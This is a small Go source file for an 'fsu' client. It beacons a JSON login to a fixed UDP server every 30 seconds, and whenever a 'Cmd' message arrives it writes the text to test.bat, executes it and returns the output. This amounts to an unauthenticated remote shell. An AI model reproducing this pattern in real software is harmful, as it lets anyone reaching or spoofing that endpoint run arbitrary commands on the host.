package fsu

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

var svrAddr *net.UDPAddr

type FsuInfo struct {
	FsuId   string
	Type    string
	MacAddr string
	ExtInfo string
}

func Init() {

	info := FsuInfo{
		"12345",
		"Login",
		"12-34-12-43-11",
		"99",
	}
	buffer, _ := json.Marshal(info)
	svrAddr, _ = net.ResolveUDPAddr("udp4", "172.30.155.201:8088")
	conn, err := net.DialUDP("udp", nil, svrAddr)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()
	go func() {
		for {
			conn.Write(buffer)
			time.Sleep(30 * time.Second)
		}
	}()
	handClient(conn)
}

func handClient(conn *net.UDPConn) {
	var buf [1024]byte
	for {
		fmt.Println("begin read")
		n, _, err := conn.ReadFromUDP(buf[0:])
		if err != nil {
			fmt.Println(err)
			return
		}
		info := FsuInfo{}
		err = json.Unmarshal(buf[0:n], &info)
		if err != nil {
			fmt.Println(err)
			continue
		}
		if info.Type == "Cmd" {
			createSh(info.ExtInfo)
			out, err := exec.Command("test.bat").Output()
			if err != nil {
				fmt.Println(err)
				continue
			}
			info.ExtInfo = string(out)
			info.Type = "Response"
			fmt.Println("Response:", info)
			conn.Write(must(json.Marshal(info)))
		}
	}
}

func createSh(cmd string) {
	fileNmae := "test.bat"
	fout, err := os.Create(fileNmae)
	defer fout.Close()
	if err != nil {
		fmt.Println(fileNmae, err)
		return
	}
	fout.WriteString(cmd)
}

func must(info []byte, err error) []byte {
	return info
}
